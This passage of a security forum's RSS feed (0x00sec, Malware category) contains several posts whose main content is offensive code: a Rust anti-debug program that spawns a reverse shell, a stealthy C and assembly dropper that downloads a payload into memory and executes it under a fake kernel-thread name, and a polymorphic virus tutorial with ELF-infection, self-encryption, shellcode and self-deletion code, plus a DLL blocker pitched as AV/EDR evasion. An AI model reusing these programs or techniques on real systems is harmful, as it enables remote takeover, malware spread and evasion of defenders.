UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;policy, sizeof(policy), NULL, NULL);
</code></pre>
<h3><a name="h-5-creating-the-target-process-9" class="anchor" href="https://0x00sec.org#h-5-creating-the-target-process-9"></a>5. Creating the Target Process:</h3>
<p>We use the <code>CreateProcessW</code> function to create the target process (specified in our argument to the path of the program we would like to run), passing the converted wide-character path and the initialized attributes. If the process creation fails, we handle the error and display an appropriate error message, again returning a error code of 1.</p>
<pre><code class="lang-c">if (!CreateProcessW(
    NULL,
    wideCharBuffer,
    NULL,
    NULL,
    true,
    EXTENDED_STARTUPINFO_PRESENT,
    NULL,
    NULL,
    reinterpret_cast&lt;LPSTARTUPINFOW&gt;(&amp;si),
    &amp;pi
))
{
    fprintf(stderr, "Failed to create the target process.\n");

    // Clean up allocated resources
    delete[] wideCharBuffer;
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    return 1;
}
</code></pre>
<h3><a name="h-6-cleanup-and-resource-deallocation-10" class="anchor" href="https://0x00sec.org#h-6-cleanup-and-resource-deallocation-10"></a>6. Cleanup and Resource Deallocation:</h3>
<p>After the process creation, we close the process handles and deallocate the dynamically allocated resources to prevent memory leaks. This step ensures that system resources are properly released (yes I know this is a super small and simple program and this hardly has any effect on preformance or usability but we are supposed to be good programmers and this is the correct coding etiquette).</p>
<pre><code class="lang-c">// Close the process handles
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);

// Clean up allocated resources
delete[] wideCharBuffer;
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
</code></pre>
<h3><a name="h-7-profit-11" class="anchor" href="https://0x00sec.org#h-7-profit-11"></a>7. Profit???</h3>
<p>Wow it feels like just 5 minutes ago we were nothing but meer skids copy and pasting 20 year old code from StackOverflow without a care in the world and now look at us, we are fully fledged programmers with an 31337 AV/EDR bypass program that is ready to be compiled and executed and ran in the wild (with consent of course ;). Now that we have finished our program, lets compile it and see what happens when we try to inject a external unsigned DLL into a poor defenceless ordinary program.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd.png" data-download-href="/uploads/short-url/46L2xciGD1OmFS99DnIUPafLk2p.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd_2_689x128.png" alt="" data-base62-sha1="46L2xciGD1OmFS99DnIUPafLk2p" role="presentation" width="689" height="128" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd_2_689x128.png, https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd_2_1033x192.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd.png 2x" data-dominant-color="3B3E45"></a></div><br>
<em>Running <strong>dummy_program.exe</strong> with <strong>DLL Blocker</strong></em><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/3/83e69631323fdad6db11d2fe555ff427e7a42ba7.png" data-download-href="/uploads/short-url/iOQzR6btj5RZdefUwGOP31uEevJ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/3/83e69631323fdad6db11d2fe555ff427e7a42ba7.png" alt="" data-base62-sha1="iOQzR6btj5RZdefUwGOP31uEevJ" role="presentation" width="690" height="300" data-dominant-color="2E3032"></a></div><br>
<em>Process explorer output before injection</em><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/c/2c8db2e9e9082c6f09c1d8da1bf268e2aed2118a.png" data-download-href="/uploads/short-url/6m8B1sqOAnJpp89i3MJiEXYIEga.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/c/2c8db2e9e9082c6f09c1d8da1bf268e2aed2118a_2_690x162.png" alt="" data-base62-sha1="6m8B1sqOAnJpp89i3MJiEXYIEga" role="presentation" width="690" height="162" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/c/2c8db2e9e9082c6f09c1d8da1bf268e2aed2118a_2_690x162.png, https://0x00sec.s3.amazonaws.com/optimized/3X/2/c/2c8db2e9e9082c6f09c1d8da1bf268e2aed2118a_2_1035x243.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/c/2c8db2e9e9082c6f09c1d8da1bf268e2aed2118a.png 2x" data-dominant-color="393B42"></a></div><br>
<em>Injecting <strong>AV/EDR Simulated DLL</strong></em><p></p>
<p>Now hopefully if everything decided to behave itself we <em>should</em> see no changes to our <strong>dummy_program.exe</strong> or in the loaded DLLs monitored within process explorer.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/a/9a4a33f84935c8b3fb3a6a8891f830df80ccaa9a.png" alt="" data-base62-sha1="m0UvB81KygCRJl0YvcOAJbmuCMi" role="presentation" width="412" height="211"><br>
<em>Error popup indicating the DLL failed to inject/load into <strong>dummy_program.exe</strong></em></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd.png" data-download-href="/uploads/short-url/46L2xciGD1OmFS99DnIUPafLk2p.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd_2_689x128.png" alt="" data-base62-sha1="46L2xciGD1OmFS99DnIUPafLk2p" role="presentation" width="689" height="128" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd_2_689x128.png, https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd_2_1033x192.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/1/c/1ccc48238da9e9ccc6daa1ba75482865f809eadd.png 2x" data-dominant-color="3B3E45"></a></div><br>
<em><strong>dummy_program.exe</strong> still running with <strong>DLL Blocker</strong> and no change to output</em><p></p>
<p>and finally…</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/5/35958dc3d5930195c2dc4911fc3ca35ec84a2f0a.png" data-download-href="/uploads/short-url/7E1IQMa8mHQokUjprDjOgH9DJi2.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/5/35958dc3d5930195c2dc4911fc3ca35ec84a2f0a.png" alt="" data-base62-sha1="7E1IQMa8mHQokUjprDjOgH9DJi2" role="presentation" width="690" height="288" data-dominant-color="2E3132"></a></div><br>
<em>Process explorer output showing that no other DLLs have loaded into <strong>dummy_program.exe</strong></em><p></p>
<p>Success!</p>
<h2><a name="conclusion-12" class="anchor" href="https://0x00sec.org#conclusion-12"></a>Conclusion</h2>
<p>In this article, we explored the process of building a DLL Blocker program using C and the Windows API. By implementing process creation mitigation policies, we can effectively protect a program from potential DLL injection attacks and/or from AV/EDR hooking. However, it’s important to understand the limitations of this approach. The policy we enabled in the program is effective in preventing the loading of non-Microsoft signed DLLs. However, it should be noted that it primarily applies to child processes created by the program. This means that if the program itself is already running and has loaded unauthorized DLLs, the policy may not have an immediate impact.</p>
<blockquote>
<p>Furthermore, the effectiveness of the policy can be impacted if the AV/EDR is cross-signed by Microsoft.</p>
</blockquote>
<p>The program demonstrates just <em>one</em> possible way to help improve your projects evasion level in a secure enviroment and as I mentioned before just only just the beginning. In my next project I will be exploring a more <em>advanced</em> technique known as DLL patching and how we can also use this technique to bypass AV/EDR hooks and evade detection in a much <em>quieter</em> and <em>effective</em> way. I hope you enjoyed this article and I will see you in the next one!<br>
(This article is copied down from my website which has much better formatting and layout that you can find <a href="https://44.is-a.dev/posts/Building-A-DLL-Blocker/" rel="noopener nofollow ugc">here</a>)</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/building-a-basic-dll-blocker/36049">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/building-a-basic-dll-blocker/36049</link>
          <pubDate>Fri, 21 Jul 2023 16:10:55 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36049</guid>
          <source url="https://0x00sec.org/t/building-a-basic-dll-blocker/36049.rss">Building a basic DLL blocker</source>
        </item>
        <item>
          <title>Anti-Debug with conditional reverse-shell</title>
          <dc:creator><![CDATA[21232f297a57a5a74389]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>If you are reading this, this program is basic anti-debug in rustlang, it is able to detect whether or not it is being debugged.<br>
If the program is detected an active tracer then it won’t execute it’s payload…If no then it will send the reverse shell.</p>
<pre><code class="lang-auto">
use nix::sys::ptrace::traceme;
use std::process::exit;

fn main() {
        let _res = match traceme() {
                Ok(_s) =&gt; invade(),Err(_e) =&gt; evade()
        };
        exit(0)
}

fn evade() {
        println!("......Debugger...Detected......")
}

fn invade() {
        use std::net::TcpStream;
        use std::process::{Command, Stdio};
        use std::os::unix::io::{AsRawFd, FromRawFd};

        println!("......Offensive...Started......");
        let stream = TcpStream::connect("127.0.0.1:4444").unwrap();
        let fd = stream.as_raw_fd();
        Command::new("/bin/sh")
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()
                .unwrap()
                .wait();
}

</code></pre>
<p>To understand how it work technically:<br>
Linux debugger use ptrace() to trace, On Linux a process may only call ptrace() once this means if a process is already being debugged then it cannot call ptrace (it will result an Error) this makes debugger detection kinda easy show that we can just issue our own ptrace call(s), evaluate the results and decide what we can do…</p>
<blockquote>
<p>I will be very happy on your reviews <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=12" title=":blush:" class="emoji" alt=":blush:" loading="lazy" width="20" height="20"></p>
</blockquote>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490</link>
          <pubDate>Sat, 10 Jun 2023 17:25:34 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-35490</guid>
          <source url="https://0x00sec.org/t/anti-debug-with-conditional-reverse-shell/35490.rss">Anti-Debug with conditional reverse-shell</source>
        </item>
        <item>
          <title>Super-Stealthy Droppers (Updated)</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>In the original <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">post</a>, I described how to use <code>memfd_create</code> and <code>fexecve</code> to download a program into memory and run it from there. The post also provided some alternatives in case, either <code>memfd_create</code> or <code>fexecve</code> were not available.</p>
<p>For the alternative implementation of <code>fexecve</code> I used the trick to get a path to a file descriptor using <code>/proc/PID/fd/NN</code>. That is perfectly fine, however, you may run in two problems when using that technique:</p>
<ul>
<li>First, the system may not have a <code>/proc</code> pseudo filesystem. Even when this is rare nowadays, it may happen, specially when dealing with embedded platforms.</li>
<li>Second, implementing that technique in assembler is a pain in the ass. Believe it or not, printing a decimal number requires quite some code.</li>
</ul>
<p>So. it is good to keep some tricks under your sleeve.</p>
<h1>
<a name="introducing-execveat-1" class="anchor" href="https://0x00sec.org#introducing-execveat-1"></a>Introducing <code>execveat</code>
</h1>
<p><code>execveat</code> is a system call introduced on kernel 3.19, so it is relatively recent. Actually, it is more recent than <code>memfd_create</code> which was introduced on kernel 3.17… No, I do not have a prodigious  memory… that information is in the man pages for both system calls <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>Actually, <code>fexecve</code> man page provides the details on how to proceed when no <code>/proc</code> filesystem is available, and tell us that, in such cases, <code>execveat</code> is used. As a side note, some times people ask for  books and resources to learn, so… there you go, the man pages are full of very juicy information. Read them, specially the final sections where <code>NOTES</code> and <code>BUGS</code> are described.</p>
<p>So, let’s rewrite our dropper using this “<em>new</em>” system call.</p>
<pre><code class="lang-c">int main (int argc, char **argv, char **env) {
  int                fd, s, l;
  unsigned long      addr = 0x0100007f11110002;
  char               *args[2]= {"[kswapdO]", NULL};
  char               buf[1024];

  s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP);
  connect (s, (struct sockaddr*)&amp;addr, 16);
  fd = memfd_create("a", MFD_CLOEXEC);

  while (1) {
      l = read (s, buf, 1024);
      if (write (fd, buf, l) &lt; 1024) break;
    }
  close (s);

  execveat (fd, "", args, env, AT_EMPTY_PATH);
  
  return 0;
}
</code></pre>
<p>The code doesn’t look that different when compared to the original one. We have just changed the call to <code>fexecve</code> into a call to <code>execveat</code>. Source code-wise we have not gain much… same number of instructions, however, the big difference is that <code>fexecve</code> is a function that implies much more code that just invoking <code>execveat</code> which is a single system call. Actually, <code>fexecve</code> when using the <code>/proc</code> file system, requires two system calls as well as the code to print the PID in decimal…</p>
<p>Back to our new code, in order to use <code>execveat</code> to run a program using just its file descriptor, we have to provide the <code>AT_EMPTY_PATH</code> flag (flags are provided as the fourth argument). This flag says the system call that the path argument (2nd argument) will be an empty string and the system call should only use the file descriptor provided as first argument.</p>
<p>For the rest of the program you may read <a href="https://0x00sec.org/t/programming-for-wannabes-part-v-a-dropper/23090">this</a> or <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">this</a> in case there is some part that you do not understand (of course, you can also drop your question in comments down below).</p>
<h1>
<a name="bonus-2" class="anchor" href="https://0x00sec.org#bonus-2"></a>Bonus</h1>
<p>This was a too short post, so let’s include an assembler version of the program. This is specially simple because the program, as it is now, is just a bunch of system calls invoked one after the other:</p>
<pre><code class="lang-auto">section .text
global _start

_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 ; Read buffer + Socket + size

	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6      ; IPPROTO_TCP
	mov rax, 41     ; socket
	syscall
	
	mov r12, rax    ; Save socket on r12 for later

	;; memfd_create ("a", 1)
	lea rdi, [rel fname]
	mov rsi, 1
	mov rax, 319       ; memfd_create
	syscall
	mov r13, rax		; Save fd in R13 for later

 	mov rdi, r12
	lea rsi, [rel addr]
	mov rdx, 16
	mov rax, 42   ; Connect !
	syscall

	lea rsi, [rbp]
l0:				
	;; _read (s = r12, rdi, 1024);
	mov rdi, r12
	mov rdx, 1024
	mov rax, 0  ; read
	syscall

	;; _write (fd = r13, rdi, result of read)
	mov rdi, r13
	mov rdx, rax
	mov rax, 1  ; write
	syscall
	cmp eax, 1024
	jl done
	jmp l0
	
done:
	mov rdi, r12
	mov rax, 3 ; close
	syscall

	mov rdi, r13
	lea rsi, [rel fname + 1]
	xor rdx, rdx
	xor r10, r10
	mov r8, 0x1000
	mov rax, 322; execat
	syscall
	
	addr    dq 0x0100007f11110002
	fname   db "a",0
</code></pre>
<p>There are only two comments regarding this code:</p>
<ul>
<li>The frame pointer at the beginning of the code can be removed. It is an artefact from a previous post . For a program as simple as this, it is better to just use the available registers and we do not really need to create a stack frame as there is no function call involved… Just use the stack as buffer when needed.</li>
<li>The second parameter to <code>execveat</code> is a null string. Note that we just reuse the name passed to <code>memfd_create</code> but we increase the pointer 1 byte so it points to the ending zero… That is a NULL string in assembler.</li>
</ul>
<p>This version is around 350 bytes, but I bet it can be reduced even more. If you manage to get it under 300 let me know <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/super-stealthy-droppers-updated/35345">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/super-stealthy-droppers-updated/35345</link>
          <pubDate>Fri, 02 Jun 2023 15:02:46 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-35345</guid>
          <source url="https://0x00sec.org/t/super-stealthy-droppers-updated/35345.rss">Super-Stealthy Droppers (Updated)</source>
        </item>
        <item>
          <title>Writing a simple, Stealthy malware</title>
          <dc:creator><![CDATA[0xf00]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1>
<a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>This article will discuss and demonstrate how polymorphic malware use self-modification to hide its inner workings, In my previous post metamorphic malware, I explained how to write a malware with metamorphism features. So what is it, Well, Polymorphic malware is an old idea basically “is being able to assign a different behavior or value to something” which make it tricky to detect and protect against, Polymorphic malware takes advantage of encryption to obfuscate its original code effectively evading detection by traditional signature-based detection mechanisms. <a href="https://github.com/0xf00I/Dark-morph" rel="noopener nofollow ugc">Source Code</a></p>
<p>encrypting the code, However, The effectiveness of AV has improved over time In the early days detection relied heavily on signature-based scanning which programs would compare files and system components against a database of known malware signatures. which a malware can still be deadly until they’re detected and signed by antivirus companies, Now AV focuses more on using A.I and implementing more sophisticated algorithms such as behavior-based detection (monitoring the actions and activities of running programs) Still, There are plenty of examples of malware ignored by everyone because they are silent enough not to attract the attention of the guards.</p>
<h1>
<a name="background-2" class="anchor" href="https://0x00sec.org#background-2"></a>Background</h1>
<ul>
<li>I’m assuming you’re familiar with Encryption techniques, XOR encryption, memory access and protection – before continuing, it’s recommended you read up on these topics.</li>
</ul>
<h1>
<a name="overview-3" class="anchor" href="https://0x00sec.org#overview-3"></a>Overview</h1>
<ul>
<li>The malware designed to be simple in the way it behave but complex enough to not  attract attention, The idea behind the malware is not about executing payload but only about obfuscation and self-modification we will explore code snippets that demonstrate the implementation of obfuscation. These snippets will provide insights into the specific techniques and mechanisms employed to evade detection, Finally I’ll provide a detailed explanation of each code segment, shedding light on the inner workings of the malware.</li>
</ul>
<h2>
<a name="execution-flow-4" class="anchor" href="https://0x00sec.org#execution-flow-4"></a>Execution flow</h2>
<p>The malware scans the current directory and overwrites all executable files that have not been previously infected each propagation uses a unique version of the code, randomly selects an executable file and infects it by applying obfuscation techniques.The infected file becomes a carrier for the obfuscated code, allowing it to spread to other directories when executed.</p>
<h3>
<a name="propagation-5" class="anchor" href="https://0x00sec.org#propagation-5"></a>Propagation</h3>
<p>The malware scans the current directory and overwrites all executable files that have not been previously infected, Infect different directory based on user privileges.</p>
<pre><code class="lang-auto">// Entry point
void infectRandomExecutable(const char* directoryPath) {
        struct stat st;
      //   JUNK
    char* targetDirectory;
    if (getuid() == 0) {
        targetDirectory = "/bin";
    } else {
        targetDirectory = "/tmp";
    }
    DIR* dir = opendir(targetDirectory);
    if (dir == NULL) {
        ("opendir");
        return;
    }
    struct dirent* entry;
    int numExecutables = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry-&gt;d_type == DT_REG) {
            char* fileName = entry-&gt;d_name;
            if (isELF(fileName) &amp;&amp; isClean(fileName)) {
                numExecutables++;
            }
        }
    }
    closedir(dir);
    if (numExecutables == 0) {
        printf("No executables found in %s\n", targetDirectory);
        return;
    }
          //   JUNK
    srand(time(NULL));
    int targetIndex = rand() % numExecutables + 1;
    dir = opendir(targetDirectory);
    int currentIdx = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry-&gt;d_type == DT_REG) {
            char* fileName = entry-&gt;d_name;
            if (isELF(fileName) &amp;&amp; isClean(fileName)) {
                currentIdx++;
                if (currentIdx == targetIndex) {
                    char fullPath[PATH_MAX];
                    snprintf(fullPath, sizeof(fullPath), "%s/%s", targetDirectory, fileName);
                    int vfd = open(fullPath, O_RDONLY);
                    infectHostFile(fullPath, vfd);
                    close(vfd);
                    printf("Successfully infected: %s\n", fullPath);
                    break;
                }
            }
        }
    }
    closedir(dir);
}
</code></pre>
<h3>
<a name="obfuscation-6" class="anchor" href="https://0x00sec.org#obfuscation-6"></a>Obfuscation</h3>
<p>The malware modifies its own instructions at runtime, enabling it to exhibit different behaviors dynamically, the self-modification is employed through the encryption process. The malware modifies the code section by XORing its bytes with a counter value. This process alters the code bytes, effectively encrypting the code section.</p>
<pre><code class="lang-auto">void b_xor(unsigned char* xorcode, size_t size) {
    unsigned char key[32];
    RAND_bytes(key, sizeof(key));
    for (int i = 0; i &lt; XOR_ROUNDS; i++) {
        for (int j = 0; j &lt; size; j++) {
            xorcode[j] ^= key[j % sizeof(key)];
        }
    }
}</code></pre>
<p>The underlying idea behind XOR obfuscation is its use in  one-time pad. Given a plaintext represented in bits, if it is  XORed with a random key of equal length, then the resulting  encryption is perfectly secure.</p>
<p>the plaintext represents a malware, then one can encrypt the malware by using a key of equivalent length. However, this requires huge key sizes. As a  result, we use short key, single byte, and encrypt equivalent sized blocks. The use of a  single byte is known as single-byte XOR encoding  Due to short keys used in XOR encoding based obfuscation, there are various tools that can deobfuscate the malware or find the key. That’s why we randomly generate our key’s using</p>
<pre><code class="lang-auto">RAND_bytes(key, sizeof(key));
</code></pre>
<pre><code class="lang-auto">unsigned char* generateRandomKey(size_t size) {
    unsigned char* key = (unsigned char*)malloc(size);
    RAND_bytes(key, size);
    return key;
}
</code></pre>
<h3>
<a name="self-modification-7" class="anchor" href="https://0x00sec.org#self-modification-7"></a>Self-modification</h3>
<p>The encrypt_code function modifies the code section by XORing its bytes with a counter value derived from the initialization vector (IV). This process alters the code bytes, effectively encrypting the code section.By encrypting the code, the malware achieves polymorphic behavior because the encrypted code appears different each time it runs. This makes it challenging for static analysis techniques to detect and analyze the malicious behavior.</p>
<pre><code class="lang-auto">// get pointer to first byte of main function
uint8_t* code = (uint8_t*) &amp;main;
// calculate page size and mask for page alignment
long pagesize = sysconf(_SC_PAGESIZE);
if (pagesize &lt;= 0)
return 1;
size_t mask = pagesize - 1;
// align code to page boundary
void* alignedcode = (void*) ((size_t) code &amp; ~mask);
// make code writable
if (mprotect(alignedcode, (size_t) code - (size_t) alignedcode + END, PROT_READ | PROT_WRITE | PROT_EXEC))
return 1;
</code></pre>
<p>The encrypt_code function takes a code section, size, key, and initialization vector (IV) as parameters. It encrypts the code section using AES encryption. It generates a counter value using the IV and XORs the code bytes with the counter. This effectively encrypts the code section.</p>
<pre><code class="lang-auto">void encrypt_code(unsigned char* xorcode, size_t size, unsigned char* key, size_t keylen) {
    AES_KEY aes_key;
    AES_set_encrypt_key(key, keylen * 8, &amp;aes_key);
    AES_encrypt(xorcode, xorcode, &amp;aes_key);
}</code></pre>
<p>We also add a random delay before encryption by generating a delay between 0 and 999 milliseconds using srand and rand. It then sleeps for the calculated delay using usleep</p>
<pre><code class="lang-auto">// add random delay before encryption
srand(time(NULL));
int delay = rand() % 1000; // random delay between 0 and 999 milliseconds
usleep(delay * 1000);
// make code read-only and executable
if (mprotect(alignedcode, (size_t) code - (size_t) alignedcode + END, PROT_READ | PROT_EXEC))
return 1;
</code></pre>
<p>After the encryption process and delay, the code snippet makes the code section read-only and executable again using mprotect. This helps to enforce memory protection and prevent further modifications.</p>
<h3>
<a name="anti-analysis-8" class="anchor" href="https://0x00sec.org#anti-analysis-8"></a>Anti-Analysis</h3>
<p>In this part we use a various forms of anti-analysis measures, and self-modifying behavior, making it more difficult for analysts to understand the inner workings of the code and extract meaningful information</p>
<h4>
<a name="anti-debugging-9" class="anchor" href="https://0x00sec.org#anti-debugging-9"></a>Anti-debugging</h4>
<p><a href="https://packetstormsecurity.com/files/157562/Linux-x64-Anti-Debug-Trick-INT3-Trap-Shellcode.html" rel="noopener nofollow ugc">Anti-Debug Trick INT3 Trap Shellcode the INT3 instruction</a>, triggers a breakpoint interrupt, commonly used for debugging purposes. By incorporating INT3 instructions strategically within the shellcode, it attempts to interrupt and disrupt the debugging process, making it difficult for a debugger to analyze the code flow.</p>
<pre><code class="lang-auto">char shellcode[] =
"\xeb\x63\x48\x89\xe6\x6a\x0d\x59"\
"\x6a\x01\xfe\x0c\x24\xe2\xf9\x80"\
"\xc9\x0d\x54\x48\x89\xe2\x0f\x05"\
"\xcc\x48\x31\xc0\x48\x89\xc7\xb0"\
"\x3c\xeb\xf3\x6a\x0d\x59\x4d\x31"\
"\xc9\x41\x51\xe2\xfc\x49\x89\xe1"\
"\x49\x83\xc1\x03\x41\x80\x09\x14"\
"\x49\x83\xc1\x0d\x66\x41\x83\x09"\
"\xff\xe8\xbc\xff\xff\xff\x99\x48"\
"\x31\xc0\xb0\x3b\x52\x48\xbf\x2f"\
"\x62\x69\x6e\x2f\x2f\x73\x68\x57"\
"\x54\x5f\x4d\x31\xc9\x4c\x89\xce"\
"\x48\x89\xf2\xeb\xb1\x6a\x0d\x58"\
"\x6a\x05\x5f\x6a\x08\x41\x5a\xeb"\
"\xb2";
</code></pre>
<h4>
<a name="anti-disassembling-10" class="anchor" href="https://0x00sec.org#anti-disassembling-10"></a>Anti-disassembling</h4>
<p>“junk code” we defined macro named JUNK, which consists of assembly instructions deliberately designed to confuse reverser, These instructions introduce meaningless code that can make the disassembly output more hard to know what exactly going on.</p>
<pre><code class="lang-auto">#define JUNK \

__asm__ volatile(
"xor %eax, %eax\n"\
"jz .+5 \n"\
".word 0xC483 \n"\
".byte 0x04 \n");
</code></pre>
<h4>
<a name="autodestruction-11" class="anchor" href="https://0x00sec.org#autodestruction-11"></a>Autodestruction</h4>
<p>This Part of the code will come as Kill-Switch sending the malware a command to delete itself from infected devices also it can be used as anti-analysis techniques. simply utilizing a combination of forking a child process and executing code in the child process, the autodestruction mechanism adds a layer of complexity to the self-destruction process. This complexity can make it more challenging for novice reversers or analysts to understand the behavior of the malware, By dynamically creating a detached thread and copying code instructions into memory, the autodestruction mechanism can avoid static analysis techniques that rely on examining the original executable file. Additionally, the attempts to delete the file and the usage of sleep delays further complicate the analysis process.</p>
<p>remote_thread that is executed in a remote process. It waits for the parent process to terminate using pthread_join, attempts to delete the file specified by szFileName using fnUnlink, and if the deletion fails, it sleeps for one second before trying again. Finally, it exits the remote process using fnExit</p>
<pre><code class="lang-auto">/* Routine to execute in remote process. */
static void remote_thread(SELFDEL *remote)
{
/* wait for parent process to terminate */
void *status;
pthread_join(pthread_self(), &amp;status);
/* try to delete the executable file */
while(remote-&gt;fnUnlink(remote-&gt;szFileName) == -1)
{
/* failed - try again in one second's time */
remote-&gt;fnSleep(1);
}
/* finished! exit so that we don't execute garbage code */
remote-&gt;fnExit(0);
}</code></pre>
<p>SelfDelete function that initiates the self-deletion process. It creates a child process using fork() and executes different code paths for the parent and child processes.</p>
<pre><code class="lang-auto">/* Delete currently running executable and exit */
int SelfDelete(int fRemoveDirectory)
{
SELFDEL local = {0};
pid_t pid = fork();
if (pid == -1) {
perror("fork");
return -1;
} else if (pid == 0) { // child process
// copy in binary code
memcpy(local.opCodes, &amp;remote_thread, CODESIZE);
local.fnWaitForSingleObject = (void (*)(void *))pthread_join;
local.fnCloseHandle = (void (*)(void *))pthread_detach;
local.fnUnlink = unlink;
local.fnSleep = (void (*)(unsigned int))sleep;
local.fnExit = exit;
local.fRemDir = fRemoveDirectory;
getcwd(local.szFileName, PATH_MAX);
strcat(local.szFileName, "/");
strcat(local.szFileName, program_invocation_name);
// Give remote process a copy of our own process pid
local.hParent = getpid();
// create detached thread
pthread_attr_t attr;
pthread_attr_init(&amp;attr);
pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_DETACHED);
pthread_t tid;
int rc = pthread_create(&amp;tid, &amp;attr, (void *(*)(void *))&amp;remote_thread, &amp;local);
pthread_attr_destroy(&amp;attr);
if (rc != 0) {
perror("pthread_create");
    return -1;
}
// sleep for a second before exiting
sleep(1);
    return 0;
} else { // parent process
    return 1;
    }
}</code></pre>
<p>In the child process, it initializes the local structure with relevant information, such as copying the remote_thread code into opCodes, setting function pointers to appropriate functions, obtaining the file name using getcwd and program_invocation_name, and setting the parent process ID. It then creates a detached thread using pthread_create, passing the remote_thread function and the local structure as arguments. After a sleep of one second, it returns 0, indicating that it is the child process.</p>
<h1>
<a name="end-12" class="anchor" href="https://0x00sec.org#end-12"></a>END</h1>
<p>In this article, we explored propagation, infection, code obfuscation, and anti-analysis techniques. I hope you learned something from this. Please notice that this article is not meant to give script kiddies ready-made malware that they will be able to use. This article only has to teach you the basics of malware development.</p>
            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/writing-a-simple-stealthy-malware/35173">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writing-a-simple-stealthy-malware/35173</link>
          <pubDate>Mon, 22 May 2023 21:28:26 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-35173</guid>
          <source url="https://0x00sec.org/t/writing-a-simple-stealthy-malware/35173.rss">Writing a simple, Stealthy malware</source>
        </item>
        <item>
          <title>Keylogger :- A Basic Malware</title>
